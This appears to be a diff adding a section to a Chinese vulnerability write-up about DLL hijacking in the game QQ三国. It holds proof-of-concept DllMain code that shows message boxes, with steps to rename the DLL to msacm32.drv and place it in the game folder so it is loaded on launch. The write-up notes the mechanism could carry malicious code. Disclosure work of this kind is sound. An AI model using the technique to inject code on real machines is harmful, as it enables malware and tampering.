@@ -18,3 +18,40 @@ QQ三国由于是很老的游戏了，在安全方面做的实在差强人意。
 [攻击演示视频](https://space.bilibili.com/236140068)
 
 攻击视频我还在录制，目前这个链接只是链接到我的个人空间。
+
+## 漏洞详细的细节
+
+编写DLL文件，在`DllMain` 中增加如下代码：
+
+``` cpp
+BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
+{
+	if (dwReason == DLL_PROCESS_ATTACH)
+	{
+		wsprintf(buffer, L"注入成功 %d", (DWORD)hModule);
+
+		MessageBox(NULL, buffer, L"SUCCESS", MB_OK);
+
+		return TRUE;
+	}
+	else if (dwReason == DLL_PROCESS_DETACH)
+	{
+
+		wsprintf(buffer, L"退出成功 %d", (DWORD)hModule);
+
+		MessageBox(NULL, buffer, L"SUCCESS", MB_OK);
+
+		return TRUE;
+	}
+
+	return TRUE;
+}
+```
+
+编译为32位的dll文件，并把文件重命名为 **msacm32.drv**,将该文件复制到三国的根目录，如 *C:\Program Files\腾讯游戏\QQ三国\*
+
+一切就绪，运行QQ三国程序，选择大区后点击进入游戏。
+
+稍后在游戏界面将连续弹窗：注入成功->退出成功->注入成功->退出成功
+
+可以利用上述机制实现一些恶意代码
